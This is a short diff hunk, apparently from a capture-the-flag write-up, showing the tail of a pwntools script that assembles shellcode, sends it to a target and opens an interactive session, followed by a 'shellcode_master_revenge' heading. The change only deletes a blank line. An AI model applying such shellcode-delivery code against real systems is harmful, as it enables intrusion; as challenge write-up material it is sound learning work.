@@ -148,7 +148,6 @@ shellcode = asm(shellcode)
 io.sendline(shellcode)
 print(io.recvall())
 io.interactive()
-
 ```
 
 ## shellcode_master_revenge
